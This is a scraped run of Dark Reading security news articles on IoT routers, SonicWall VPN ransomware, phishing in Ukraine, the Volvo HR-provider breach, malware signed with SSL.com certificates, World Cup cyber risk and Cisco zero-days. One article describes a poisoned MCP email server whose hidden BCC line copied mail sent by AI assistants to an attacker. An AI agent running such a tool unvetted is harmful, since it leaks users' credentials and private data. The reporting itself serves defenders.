able to meet the requirements. These are not strange or surprising requirements. It's pretty basic things like being able to support patching, being able to support auditing basic functions that you would want any IoT device to have. A responsible manufacturer has probably already been talking to trade associations and maybe even the FCC directly about participating in this program.What I would say is that the biggest concern there is not really Cisco or Avanti or Juniper, although their products have been hacked. The bigger concern is some of these smaller Asian router-makers that are not as involved in the conversations in the US about cybersecurity, and the government is really concerned that they're not going to participate, that they're not going to submit their products for testing. They may not even know about this program. And what that means is, if you're buying the cheapest router available, you're probably going to end up buying it from one of these companies outside the US that don't have the same involvement in some of the cybersecurity programs that the US is creating.If that happens, those companies may not be improving their cybersecurity the way we want them to, and businesses that buy from those companies are just as exposed as they were before.DR's Arielle Waldman: Getting everyone on the same page is always difficult. Just starting the discussions is important, but taking action takes a lot longer. Is there anything enterprises can do in the meantime? I know authentication is important, changing those default passwords. Anything else that you recommend?CD's Eric Geller: Well, the big thing these days is paying attention to all things identity. So, changing passwords, restricting user access, ensuring that you have alerts turned on. If you see suspicious behavior, I'm sure any business watching this is going to know that their vendors are pushing artificial intelligence (AI) as a way to automatically detect suspicious behavior, and it's worth looking into whether those solutions are right for any particular business. They're not always going to be right for any particular company, but sometimes they can speed up that process of finding anomalous activity, and sometimes that anomalous activity is the hack, so you do want to be aware of that stuff.DR's Arielle Waldman: Yes, monitoring makes sense. I know it's harder for small to medium-sized businesses, but it is important these days. That'll do it for us today. Thank you for having the conversation with me on IoT security, Eric."
2025-10-06 12:54:26,"September 29, 2025",Dark Reading,https://www.darkreading.com,https://www.darkreading.com/application-security/malicious-mcp-server-exfiltrates-secrets-bcc,"Sneaky, Malicious MCP Server Exfiltrates Secrets via BCC","The first known malicious MCP server is an AI integration tool that automatically sends email such as those related to password resets, account confirmations, security alerts, invoices, and receipts to threat actors.
Hundreds of organizations may be unknowingly funneling emails containing passwords, API keys, financial details, and other sensitive data straight to a threat actor through a poisoned Model Context Protocol (MCP) server.The package, dubbed postmark-mcp, is believed to be the first publicly documented malicious MCP server. Researchers at Koi Security recently discovered it on the npm repository, where it masqueraded as a legitimate tool for enabling AI assistants to send automated emails via Postmark's platform.  All It Took Was a Single Instruction: BCCKoi researchers found the tool contained a single line of code buried deep inside that ensured the threat actor would receive a copy of every email sent through the compromised package, including sensitive credentials, financial information, and other private data. The risk could be widespread: some 1,500 organizations may have downloaded the malicious package. Even if just 20% are actually using it, it would mean some 300 organizations are sending emails containing sensitive data directly to cybercriminals, according to Koi Security.MCP servers allow organization to connect their AI applications to external data and tools. They serve as a sort of universal adapter for integrating AI tools such as Anthropic's Claude or ChatGPT with external databases, content repositories, and tools. The rogue postmark-mcp for instance was designed to integrate with Postmark's email delivery service so AI assistants can automatically send transactional email such as those related to password resets, account confirmations, security alerts, invoices, and receipts. Such MCP tools often operate with full permissions and little oversight, creating a new and convenient attack vector for cybercriminals.Related:Microsoft's Voice Clone Becomes Scary & Unsalvageable""The developer didn't hack anything. Didn't exploit a zero-day. Didn't use some sophisticated attack vector,"" said Koi researcher Idan Dardikman in the security vendor's advisory referring to postmark-mcp. ""We literally handed him the keys, said, 'Here, run this code with full permissions,' and let our AI assistants use it hundreds of times a day. We did this to ourselves.""According to Dardikman, a software engineer in Paris using his real name and a GitHub profile containing numerous legitimate projects, appears to have copied Postmark's official MCP server on GitHub and published it to npm. The first 15 versions of postmark-mcp that the engineer published on npm were legitimate, worked exactly as expected, and did nothing fishy. But in the 16th version (Version 1.0.16) the engineer added a BCC command in line 231 of the code that ensured all email sent through the package would also get copied to the engineer.Related:Red Hat Investigates Widespread Breach of Private GitLab Repositories""All versions 1.0.0 through 1.0.15 were direct copies of Postmark's legitimate GitHub code,"" Dardikman tells Dark Reading. ""The attacker essentially acted as an unauthorized 'mirror,' copying Postmark's official MCP implementation to npm. These versions were clean because they were exact copies of Postmark's legitimate code."" All it took to poison the 16th version of the package was the single line Bcc: 'phan@giftshop.club'.""MCP: A Convenient New Cyberattack Vector?Such impersonation or typosquatting of legitimate packages on public code repositories is common, but can be hard for organizations to spot, Dardikman says. Postmark in this instance could theoretically have published its own official npm package to claim the namespace. Or, it could monitor for unauthorized copies of the code and add notices to the GitHub repo warning users to only use official sources.The Paris-based engineer quickly removed the poisoned postmark-mcp from npm after Koi inquired about it, but it's still likely receiving emails from organizations that are using it.MCP servers are quickly becoming a sort of backbone infrastructure for AI. Thousands of organizations have begun using them to let AI assistants automate repetitive tasks without developers needing to build custom integrations for each service. The proliferating — and often scarcely vetted use — has attracted greater cybersecurity scrutiny of the protocol itself and of tools based on the protocol. Related:Akira Hits SonicWall VPNs in Broad Ransomware CampaignRecently, researchers at Tenable and JFrog reported finding two critical vulnerabilities in different MCP components that, among other things, provided an opening for attackers to run malicious code on developer systems. There are also growing concerns about other risks too, including misconfigured and poorly secured MCP servers exposing AI tools to abuse.Organizations can mitigate some of the problems by verifying packages come from official sources, Dardikman says. Admins should check if there's a GitHub repo vs. npm publisher mismatch for instance, and only use the official GitHub source when available. It's also important to implement approval processes for MCP servers, monitor for behavioral changes between versions and stablish security reviews for AI tool integrations, he adds."

A series of attacks that struck SonicWall VPN customers in recent months may be worse than initially thought.In early August, word got out that Akira ransomware was used in attacks against SonicWall SSL VPN devices. While researchers initially thought a zero-day could have been at play, it turned out an older critical vulnerability, tracked as CVE-2024-40766, was enabling threat actors to breach customers. Although the earliest activity connected to the campaign began in mid-July, similar malicious VPN logins were tracked back to last October.Arctic Wolf on Sept. 26 published a blog post that expands on the findings of this campaign, painting a picture of a possibly widespread ransomware campaign.SonicWall VPNs Hit By ""Opportunistic Mass Exploitation""According to the Artic Wolf Labs research team, ""Threat actors obtained initial access through malicious SSL VPN logins with successful OTP Multi-Factor Authentication (MFA) challenge, and deployed Akira ransomware.""The blog post noted that as SonicWall linked the activity to CVE-2024-40766 (a bug that enables malicious logins and firewall crashes), credentials could have possibly been harvested from devices that were vulnerable at the time they were targeted. Moreover, threat actors successfully bypassed accounts with one-time password (OTP) MFA functionality enabled.Related:Microsoft's Voice Clone Becomes Scary & Unsalvageable""Malicious logins were followed within minutes by port scanning, Impacket SMB [Server Message Block] activity, and rapid deployment of Akira ransomware,"" the blog post read. ""Victims spanned across multiple sectors and organization sizes, suggesting opportunistic mass exploitation. This campaign has recently escalated, with new infrastructure linked to it observed as late as September 20, 2025.""A spokesperson for Arctic Wolf Labs told Dark Reading that attacks have been consistent since the earliest observations in July, ""with a slight decrease around the end of August and early September, picking up pace again around the end of September."" The campaign remains active.To make matters worse, Arctic Wolf said they spotted short dwell times as part of the campaign — hours rather than days and shorter than an hour in some cases — and conceded that ""we are still not able to explain how threat actors were able to successfully bypass MFA.""The research team did not believe this Akira campaign was connected to a recent breach SonicWall suffered in which attackers compromised the MySonicWall service and accessed backup firewall configurations tied to ""fewer than 5%"" of customers.Related:Red Hat Investigates Widespread Breach of Private GitLab RepositoriesMitigating Akira Attacks on SonicWall SSL VPNsA range of SonicWall devices have been targeted as part of this campaign, namely NSA and TZ series SonicWall devices running versions of SonicOS 6 and 7. Researchers said they were unable to completely scope affected software and hardware versions, though they cited SonicOS firmware 6.5.5.1-6n, 7.0.1-5065, 7.0.1-5119, 7.1.2-7019, 7.1.3-7015, 7.3.0-7012 as vulnerable, as well as hardware models NSa 2600, NSa 2700, NSa 4650, NSa 5700, TZ370, and TZ470.In its latest guidance, SonicWall recommended customers update their firmware to version 7.3.0 and reset all local user account passwords with SSL VPN access. However, the blog post stated that researchers saw intrusions affecting devices running 7.3.0 as well, and cited research from cybersecurity firm Field Effect that firewalls running even more recent versions (such as 8.0.2) were impacted.Arctic Wolf Labs explained that based on SonicWall's guidance, ""the current campaign may trace back to earlier exploitation of CVE-2024-40766, impacting SonicOS 5, 6, and 7. In this scenario, credentials stolen from vulnerable firewalls could have been carried forward to newer SonicOS versions, leaving devices exposed even after firmware updates,"" the blog post read.Related:Sneaky, Malicious MCP Server Exfiltrates Secrets via BCCIn addition to SonicWall's guidance, Arctic Wolf recommends that firewall users monitor for VPN logins originating from untrusted hosting infrastructure, maintain visibility into internal networks, monitor for anomalous SMB activity indicative of Impacket use, and reset credentials wherever possible including MFA-related secrets.SonicWall has not responded to Dark Reading's request for comment."

Attackers are impersonating the Ukrainian police in a fileless phishing campaign that delivers two separate data-stealing payloads for harvesting various credentials and data as well as mining cryptocurrency from targeted systems.The attacks, which target Microsoft Windows machines at government entities in the Ukraine, use emails that include malicious Scalable Vector Graphics (SVG) files designed to trick recipients into opening harmful attachments, Fortiguard Labs Threat Research revealed in a recent blog post.Attackers disguise the messages as official notices from the National Police of Ukraine to try to trick victims into clicking on the attachments, which ultimately deliver two pieces of malware — the Amatera Stealer and PureMiner — via a fileless attack chain.""This phishing campaign demonstrates how a malicious SVG file can act as an HTML substitute to initiate an infection chain,"" Fortiguard Labs threat researcher Yurren Wan wrote in the post. ""The SVG-embedded HTML code redirected victims to a download site.""Ukraine Police ImpersonatorsThe campaign starts when victims receive a forged email claiming to be a notice from the National Police of Ukraine that includes a malicious SVG attachment, named ""elektronni_zapit_NPU.svg,"" that contains an embedded HTML <iframe> element.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteThe message informs recipients that an appeal has been submitted for review and warns that ignoring the notice could lead to further legal action. ""The text is generic but uses formal, legal-sounding language to pressure recipients into opening the attachment,"" Wan wrote.If a victim clicks on the attachment, it executes the SVG, which displays a spoofed Adobe Reader interface with the Ukrainian-language message, ""Please wait, your document is loading."" It then automatically redirects the victim to a download page with a password-protected archive, and displays the password for extracting it.The archive contains a Compiled HTML Help (CHM) file, which triggers a chain of malicious actions through an HTML Application (HTA) CountLoader.Amatera and PureMiner Payloads UnpackedUltimately, the attack installs two payloads: Amatera Stealer, which is used to harvest credentials, system data, application data, browser files, and cryptocurrency wallets; and PureMiner, a stealthy .NET cryptominer that collects adapter-specific hardware information and monitors system activity. Once executed, Amatera gathers system information including computer name, username, operating system, user location, and time zone, and then gathers credentials from various browsers and applications. Browsers targeted include Firefox, Netscape Navigator, Chrome, Edge, and Brave, as well as numerous others, and the malware also steals data from chat applications such as Telegram and Steam.Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageIt also collects hardware details such as the video card name, processor model, and total physical memory, and targets additional information including program execution paths, active processes, installed software, and clipboard contents.PureMiner, once deployed, also collects system information — particularly video adapter specifications and usage details — and can deploy CPU-based or GPU-based mining modules depending on the attacker’s configuration, Wan said.The attack chain features fileless deployment of the payloads, either through .NET Ahead-of-Time (AOT) compilation with process hollowing or by being loaded directly into memory using PythonMemoryModule, which delivered the final payload.Malicious Cyber Activity Against Ukraine PersistsSince Russia's invasion of Ukraine in February 2022, which remains ongoing, various entities in Ukraine also have been under constant threat from cyberattacks. The latest phishing campaign is just one of many that attempt to compromise public and private citizens, government agencies, and critical infrastructure in the besieged country.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessFortiguard Labs rated the fileless phishing campaign — which can take remote control of victim devices not only to steal sensitive data but also hijack computing resources and deliver additional malware — as high-severity, and warned potential victims to maintain vigilance.To that end, the blog post includes a list of indicators of compromise (IoCs), including domains/IP addresses and files related to the campaign, so defenders can arm antivirus and other security systems to detect its existence and thwart any malicious activity."

Volvo Group North America (Volvo NA) has been breached via a third-party human resources (HR) software provider.At the root of the story is Miljödata, a Swedish company specializing in occupational software-as-a-service (SaaS), whose cloud infrastructure was breached in August. Thanks to its centralized, multi-tenant arrangement, hundreds of customers and millions of individuals have been affected. In a recent letter to its staff, Volvo NA, whose parent company is based in Sweden, revealed itself to be one such victim.Like other Miljödata customers, Volvo NA's systems were untouched by the attack. Still, its employees' names and Social Security numbers (SSNs) were stolen, and potentially published to the Dark Web. According to its website, Volvo NA employs just shy of 20,000 people.""For municipalities, universities, and even big corporations like Volvo, this isn't just a security issue, it's an integrity issue,"" says Anders Askasen, vice president of product marketing at Radiant Logic. ""People suddenly wonder whether the systems handling their most sensitive data are fit for the purpose, and with good reason. That loss of confidence is as damaging as the leak itself.""The Miljödata IncidentMiljödata is widely spread across Sweden. For example, it's a supplier to around 80% of the country's municipal governments. Among its offerings is ""Adato,"" a platform for documenting and managing employee sick leave and rehabilitation processes.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteOn Aug. 20, the so-called ""DataCarry"" ransomware group breached Miljödata's cloud infrastructure. The company discovered the attack three days later. The threat actors demanded a ransom of 1.5 Bitcoins, equaling around $165,000 at the time of writing. On Sept. 12 they warned that they'd publish the stolen data to the Dark Web, and in the hours that followed they carried out that threat.The attack didn't just affect Miljödata. Because customers tend to deploy platforms like Adato in the cloud, all of their data is stewarded by Miljödata. According to local media, several universities, at least 25 companies, 164 municipalities, and more than 1.5 million individuals were impacted as a result.The leak was bad enough that, in the grand scheme of things, Volvo NA employees might even consider themselves relatively lucky. Employees of other affected organizations lost their names and personal identity numbers — Sweden's equivalent to SSNs — but also a variety of other personally identifying information (PII) such as their gender, dates of birth, details of their employment, and contact information including phone numbers, home addresses, and 870,100 email addresses.Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageOn the ground in Sweden, Askasen reports that ""this breach is among the most disruptive to strike Sweden’s public sector in years. When over a million citizens discover that personal identity numbers, contact details, and employment records are circulating on criminal forums, it delivers a direct blow to the social contract that underpins digital government, particularly in a high-tax society like Sweden, where trust in public institutions ought to be non-negotiable.""Stellantis, Jaguar Also AttackedWithin weeks of the Adato incident that impacted Volvo NA, two other vehicle manufacturing giants fell to their own, rather similar, supply chain cyberattacks.On Sep. 21 the ShinyHunters group breached Stellantis, parent company to consumer vehicle brands like Chrysler, Dodge, and Jeep, and luxury brands like Alfa Romeo and Maserati. They claimed to have stolen customer names and contact details from the company's Salesforce instance.On Aug. 31, ""Scattered Lapsus$ Hunters"" — a collaboration between hackers from ShinyHunters, Scattered Spider, and the Lapsus$ group — attacked Jaguar Land Rover (JLR). They forced the company to pause production the following day. In fact, its factory lines remained halted and employees were instructed to stay home for weeks thereafter. Finally, toward the end of the month, the company indicated that it was beginning a phased restoration of its operations.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessJLR's case best demonstrated the kinds of consequences that can result from attacks against vehicle manufacturers. The British company's government got involved  — UK prime minister Keir Starmer told the BBC it was ""working 24/7"" to support the many suppliers that rely on JLR for their own survival. ""I am acutely aware of the urgency of the situation and the difficulties that many of these companies are inevitably finding themselves [in],"" he said.In Volvo's case, though there was no impact to operations, Askasen says the consequences to the company, its employees, and even Sweden as a whole could be serious.""For Volvo, this isn't only about employee privacy — it's about national competitiveness,"" he says. ""Exposure of employee identity data creates fraud risks, but exposure of operational or HR systems also erodes confidence in the resilience of Swedish industry. Car manufacturing is deeply tied to national supply chains and the broader economy."""
2025-10-06 12:57:18,"September 26, 2025",Dark Reading,https://www.darkreading.com,https://www.darkreading.com/vulnerabilities-threats/iranian-hackers-ssl-certificates-sign-malware,Iranian State Hackers Use SSL.com Certificates to Sign Malware,"Security researchers say multiple threat groups, including Iran's Charming Kitten APT offshoot Subtle Snail, are deploying malware with code-signing certificates from the Houston-based company.
Novel malware is hard enough to detect these days, but malicious code signed with valid digital certificates is even harder to stop.That's the case with several malware strains tied to an Iranian cyber espionage group tracked as UNC1549 (aka Subtle Snail, Nimbus Manticore, Smoke Sandstorm, and Tortoiseshell) and linked to the infamous Charming Kitten advanced persistent threat (APT). According to Check Point Software and Prodaft researchers, UNC1549 has used digital certificates from SSL.com, a certificate authority (CA) based in Houston, to target European organizations with new binaries for backdoors and infostealers.Sporting SSL.com certificates made the malicious code look like legitimate software programs. ""This led to a drastic decrease in detections, with many samples remaining undetectable by multiple malware engines,"" Check Point wrote in its report.In other words, many antimalware and threat detection platforms may miss UNC1549's malware because they carry valid digital certificates, which are used to ensure trust in software, domains, user identities, and more. And while UNC1549's recent attacks have been focused on European organizations, the signed malware poses detection challenges and significant risk to any network.Related:'Trifecta' of Google Gemini Flaws Turn AI Into Attack VehicleCompanies in the public key infrastructure (PKI) sector like SSL.com are bound by the baseline requirements of the CA/Browser Forum, which are designed to prevent certificates from being mis-issued to or purchased by unauthorized parties. However, in the case of SSL.com, it would appear some of these requirements were not followed, researchers said, allowing UNC1549 to add powerful tools to their arsenal.Dark Reading contacted SSL.com through several channels to report the activity and request comment from the company. Dark Reading initially received an email response from ""Eva, SSL.com's AI Agent"" that summarized the enquiry but didn’t respond to it. A follow-up request generated a support ticket for the abused certificates, after which Dark Reading was contacted by another SSL.com ""representative"" named Joy (unclear if the representative was human or another AI agent), merely asking if she could help with the tickets before going silent. At press time, the representative has not responded to requests to speak with media relations or communications personnel at the company.Fake Companies Acquiring Valid CertificatesAccording to Prodaft's report, all malicious binaries used by UNC1549 were signed with an SSL.com certificate issued to a Dutch company called Insight Digital B.V. Prodaft's analysis of other malware used by UNC1549 in additional attacks revealed they had similar code-signing certificates issued to companies called RGC Digital AB and Sevenfeet Software AB, both based in Sweden.Related:Cisco's Wave of Actively Exploited Zero-Day Bugs Targets Firewalls, IOSIt's unclear if these are legitimate companies that have been impersonated by UNC1549, or if they are fraudulent entities created by the threat actors. Dark Reading found that the websites for Insight Digital and RGC Digital feature identical bare-bones designs with the same ""Under Construction"" stock art. None of the three companies have phone numbers or email addresses on their websites, only contact forms. The websites for Insight Digital B.V. and RGC Digital AB feature the same design with identical ""Under Construction"" stock art.""Threat actors pay a very reasonable price to SSL.com to sign these binaries and legitimate Windows DLLs with their own malicious additions to make the file appear legitimate,"" Prodaft researchers wrote in the report.A spokesperson for Prodaft tells Dark Reading that SSL.com is frequently abused by threat actors, not just UNC1549. ""We've also observed several other groups exploiting the service,"" adding that researchers have seen newly signed certificates from UNC1549 following the publication of its research last week.Check Point found the threat group has been using the CA's certificates for several months. ""Tracking of Nimbus Manticore malware in 2025, based on multiple data sources, suggests they started to use SSL.com code signing in May,"" Sergey Shykevich, threat intelligence group manager at Check Point Research, tells Dark Reading.Related:Salesforce AI Agents Forced to Leak Sensitive DataShykevich says it's difficult to determine how frequently SLL.com is abused by various threat groups, but he notes that DruidFly, a destructive wiper tied to the Iranian threat group Void Manticore, was also signed with a certificate from the CA. Shykevich says three of the four SSL.com certificates it has observed in the latest UNC1549 activity are still valid.Malicious SLL.com Certificate Use Raises Red FlagsBoth Check Point and Prodaft said they did not report the UNC1549 activity to SSL.com directly; Prodaft flagged the malicious binaries on VirusTotal to inform the broader security community of the risks.Malicious use of digital certificates, whether by illicit purchases or stolen from the original owners, typically constitutes a four-alarm fire for a CA. According to the aforementioned CA/Browser Forum's baseline requirements, a CA should revoke a certificate within 24 hours of obtaining evidence of misuse, and revocation must be completed within five days of obtaining the evidence.CAs typically take swift action against mis-issued or stolen certificates used for malware code signing — even if it causes disruptions for genuine customers that rely on the certificate for business. Penalties for repeated mis-issuance or abuse issues can be severe; in 2017, Google announced that it would revoke trust for Symantec certificates after the cloud giant found more than 30,000 mis-issued certificates, which prompted the cybersecurity vendor to sell its PKI business to DigiCert later that year.The baseline requirements include detailed rules for verifying the identity of the applicant attempting to purchase the certificate, to prevent any illicit purchases by fake entities or impersonators. This includes several steps to review and authenticate the applicant's Fully Qualified Domain Name (FQDN), including confirmation that the applicant has control over the FQDN.It's unclear what information UNC1549 provided to SSL.com when the threat actors purchased the certificates, and how convincing that information was. However, the striking similarity between the Insight Digital and RGC Digital websites and lack of any contact information on the sites would seem to be red flags for a CA.Defending Against Signed MalwareWhile malware signed with digital certificates presents significant detection challenges, enterprise security teams aren't defenseless. First, organizations can add the indicators of compromise outlined in Check Point's report, which includes file hashes, to their detection rules, which will flag UNC1549's malware even if they have valid signatures.Second, there are telltale signs in a certificate's metadata that can indicate if it's potentially malicious. In a blog post last year, Red Canary researchers highlighted signs to look for, including discrepancies between the file name and the signer — for example, a Microsoft Teams binary signed by an organization that is not Microsoft — as well as file version information that features tightly coupled creation times and signature dates.""Obviously, not all new binaries are malicious, but a recent creation time can be a leading indicator of malice, especially when it claims to be an installer for a well-established application like Microsoft Teams,"" the researchers wrote at the time."

The 2026 FIFA World Cup will be bigger in every way from past tournaments: 48 teams will play 104 games at 16 stadiums in three nations, in cities in Canada, Mexico, and the United States.Locking down such a popular and widely dispersed event poses significant challenges for event planners, infrastructure-security professionals, and cybersecurity teams. Not only will the event be the biggest football tournament — soccer to our US readers — in history, but the most technology- and automation-dependent as well.Both the size of the event and the fact that it's more reliant on technology and automation than past tournaments will increase the vulnerability of the infrastructure, says Chris Grove, director of cybersecurity strategy for Nozomi Networks, a provider of cybersecurity for operational technology.""The more we build out these things and automate and scale larger — more days, more games, more teams — the more we have to find a way to do that efficiently, and they're not scaling out the human labor force to do it,"" he says. ""They're building with technologies and processes and things, automated ticketing access controls, and being able to do a lot more with less.""The preparations come against a backdrop of FIFA tournaments historically attracting significant cyber activity. After the World Cup 2022 in Qatar, threats analysts found a compromised router that could have been used to disrupt communications during the event, including all streaming services. During the Euros 2024 football tournament, hackers compromised and put up for sale more than 15,000 credentials belonging to Union of European Football Associations (UEFA) customers.Related:China Imposes One-Hour Reporting Rule for Major Cyber IncidentsLarge sports events bring significant cyber challenges in general, but distributed events bring their own unique issues, says John Dwyer, deputy chief technology officer of Binary Defense, a managed detection and response firm. This World Cup brings together teams from 48 nations to play in arenas scattered across a single continent, similar in many ways to the Olympic Games, which also often face cyberattacks. The 2024 Summer Olympic Games in Paris for instance saw at least 140 cyberattacks, but no outages, a testament to the French government's preparations.""These threats exist right now with every sort of game that happens on Earth at this point, but with the World Cup, it's just compounded,"" he says. ""It is just the scale that makes it so much difficult.""Snowballing World Cup Cyber Threats in 2026On the cybersecurity front, the threats are mostly the same, but security experts expect them to be more intense. With so much depending on the infrastructure — from digital ticketing to streaming the games to ensuring basic services such as water and power — cybercriminals will certainly be attracted to the tournament. Binary Defense's Dwyer likens the risks to those faced by MGM and Caesars hotel and casinos, which were attacked in 2023 with ransomware, and lost tens of millions of dollars in the aftermath.Related:Czech Warning Highlights China Stealing User Data""What I am mostly concerned with is, it's a great opportunity for cybercriminals [to hit] the hospitality and transportation industries,"" he says. ""In 2023, the MGM and Caesars incidents [showed] how quickly you can create an enormous amount of pressure through causing an outage when there's a big demand.""Another risk: The World Cup 2026 also takes place during a time of heightened polarization in the political landscape, which means that there will be more hacktivist groups interested in making a statement, and stronger motivations behind those actions, says Nozomi's Grove.""I think there's more potential and concern for disruption around hacktivists this time around than four years ago,"" he says.

I sure hope that they are doing some sort of tabletop exercise to figure out how they would do this if they get a credible piece of threat intelligence, either from the cyber realm or the kinetic realm.""In March, US President Trump issued an executive order establishing a task force to prepare for the event and coordinate government efforts, but — aside from housing the group's administration to the Department of Homeland Security and assigning two security advisors to the task force — the brief order does not mention security.More Consistent CISA FundingAmong the major issues facing defenders right now is the lack of consistency in government funding for cybersecurity, with cuts to the Cybersecurity and Infrastructure Security Agency (CISA) and debates about the budget. ""We need to say, 'We need these things,' and start baking cybersecurity into the budget, so we don't have debates over cybersecurity cuts anymore,"" Nozomi Networks' Grove says.In addition, infrastructure aspects that may not often be considered with planning for a sports event, such as protecting water and wastewater treatment facilities, will become important for such a large geographically dispersed event.Overall, there is a lot of experience to pull from for planning the cybersecurity and infrastructure-protection components of the event. There is a feedback loop, says Grove: Past events inform better daily operations and what you learn in your day-to-day operations is what you bring to those events.Overall, that gives him a positive outlook on security efforts around the 2026 World Cup.""Instead of saying, 'Hey, we have this emergency, let's go do A, B, C, and D,' they're bringing it back to, 'You should be doing A, B, C, and D every day of the week, and when this big event comes along, you'll be ready for it,'"" he says. ""Today, I think we are much better at doing these tabletop exercises and looking towards implementing best security practices in our infrastructure."""

UPDATE A host of Cisco devices have been under attack in recent months thanks to zero-day security vulnerabilities affecting millions of appliances, and organizations should waste no time in patching them because they carry an enormous amount of corporate risk, the Cybersecurity and Infrastructure Security Agency (CISA) is warning.The agency published an Emergency Directive today connected to what it called ""ongoing activity"" targeting Cisco Adaptive Security Appliances (ASA). CISA assessed that the attacks are connected to the same state-sponsored advanced persistent threat (APT) behind the ArcaneDoor cyberespionage attacks in the spring of 2024, which also targeted Cisco zero days. The UK's National Cyber Security Center (NCSC) meanwhile warned that the threat actors are also implanting malware into affected Cisco devices, including RayInitiator, a persistent multi-stage boot kit, and LINE VIPER, a shellcode loader used to facilitate data exfiltration. The NCSC published a malware analysis on Sept. 25 to coincide with the warning.""The campaign is widespread and involves exploiting zero-day vulnerabilities to gain unauthenticated remote code execution [RCE] on ASAs, as well as manipulating read-only memory (ROM) to persist through reboot and system upgrade,"" CISA said. ""Cisco assesses that this campaign is connected to the ArcaneDoor activity identified in early 2024, and that this threat actor has demonstrated a capability to successfully modify ASA ROM at least as early as 2024.""Related:'Trifecta' of Google Gemini Flaws Turn AI Into Attack VehicleWithin the directive, CISA detailed multiple zero-days being used in the campaign: critical RCE flaws CVE-2025-20333 (CVSS 9.9) and CVE-2025-20363 (CVSS 9.0); and a medium-severity unauthorized access vulnerability allowing privilege escalation, CVE-2025-20362 (CVSS 6.5). The warning comes a day after Cisco itself disclosed another, different zero-day under active exploitation in the wild. That vulnerability, CVE-2025-20352 (CVSS 7.7), affects the Simple Network Management Protocol (SNMP) subsystem of Cisco IOS Software and Cisco IOS XE, which are versions of the vendor's operating system. The flaw is due to a stack overflow condition in SNMP, and can allow authenticated RCE and denial of service (DoS).Mayuresh Dani, security research manager at Qualys Threat Research Unit, notes that Cisco's enormous footprint across enterprises small and large means that mass patching is in order.Otherwise, ""when you combine legacy code, massive deployment scale, recurring subsystem flaws, expanded Web attack surfaces, and embedded system challenges — it creates a perfect vulnerable storm,"" he warns.Related:Iranian State Hackers Use SSL.com Certificates to Sign MalwareEspionage Cyber Threat Actor Targets Cisco DevicesA wide range of Cisco ASA 5500-X series firewall models are affected by the bugs disclosed today, namely those that are running Cisco ASA Software releases 9.12 or 9.14 with VPN Web services enabled, which do not support Secure Boot and Trust Anchor technologies. These models include 5512-X, 5515-X, 5525-X, 5545-X, 5555-X, and 5585-X. Certain versions of Cisco Firepower are also vulnerable to the zero-days, according to the networking giant.Cisco in its advisory also noted that many of the aforementioned devices are end of life, so customers are urged to upgrade to supported models and software releases, as appropriate. CISA's directive, meanwhile, mandates updates by the end of day on Friday: federal civilian executive branch departments and agencies ""must disconnect end-of-support devices and upgrade those that will remain in service by 11:59 PM EST on September 26, 2025.""The attacks, while state-sponsored, have not formally been attributed to a single nation, though multiple US federal agencies were apparently compromised as part of the campaign. The activity isn't surprising: high-risk vulnerabilities pop up in Cisco gear fairly regularly, and often have been hit by nation-state actors of all stripes, including those affiliated with Russia and China.Related:Salesforce AI Agents Forced to Leak Sensitive DataJason Soroko, senior fellow at Sectigo, says Cisco bugs in particular attract attackers because the devices ""are ubiquitous, sit at network choke points, and share code across many platforms.""""A single management plane flaw can hit a fleet,"" he explains. ""Internet-exposed management surfaces, especially the Web UI that many organizations leave enabled on untrusted interfaces, have enabled simple scanning and mass exploitation at scale. Patching is slowed by change control and uptime risk on critical edge devices, which gives adversaries a long window. The payoff is excellent in terms of traffic visibility, persistence, and lateral movement, so both crimeware and state actors keep investing.""A Zero-Day Bug Capable of DoS & RCEMeanwhile, the Cisco IOS and IOS XE zero-day vulnerability revealed yesterday has also faced exploitation in the wild, and the networking vendor strongly urged customers to update to a fixed version as soon as possible. As Cisco explained in a Sept. 24 advisory, ""All devices that have SNMP enabled and have not explicitly excluded the affected object ID (OID) should be considered vulnerable"" to CVE-2025-20352, which translates into at least 2 million boxes potentially at risk, according to Dustin Childs, head of threat awareness at Trend Micro's Zero Day Initiative.""The bug is definitely interesting as it affects all versions of SNMP, which really shouldn't be exposed to the Internet,"" he says. ""This bug allows attackers to get root access on affected devices. That's higher than admin access and really shouldn't be reachable at all.""Indeed, with high privileges, an authenticated, remote attacker could execute code as the root user and gain full control over a target system. In this case, ""the attacker must have the SNMPv1 or v2c read-only community string or valid SNMPv3 user credentials and administrative or privilege 15 credentials on the affected device,"" according to Cisco.Ryan Emmons, security researcher at Rapid7, tells Dark Reading that although the vulnerable configuration is non-default, it is likely ""very common"" in real-world environments.""The most notable barrier to exploitation is that high-privilege local administrator credentials are required to establish remote code execution,"" Emmons says. ""This requirement is a significant one, and it tells us that CVE-2025-20352 is more likely to be exploited during privilege escalation and lateral movement than it is to be used as an initial access vector.""The vulnerability also allows a second attack scenario, where an authenticated, remote attacker with low privileges could use CVE-2025-20352 to launch a DoS attack on an affected Cisco device: ""To cause the DoS, the attacker must have the SNMPv2c or earlier read-only community string or valid SNMPv3 user credentials.""A Cisco spokesperson shared the following statement with Dark Reading: ""We strongly urge customers to upgrade to updated releases [including IOS XE release (17.15.4a)]or — if an immediate upgrade is not feasible — implement the mitigation outlined in the advisory until an upgrade can be applied."" The mitigation it mentioned involves disabling affected object identifiers (OIDs); the advisory includes instructions for using Cisco's Software Checker to look for vulnerable configurations.The flaw also affects Meraki MS390 and Cisco Catalyst 9300 Series Switches running Meraki CS version 17 or earlier, the vendor added.This story was updated Sept 26, 2025 at 11:30 am ET to include the NCSC finding that Arcane Door attackers are spreading the RayInitiator and LINE VIPER malware as part of its campaign."

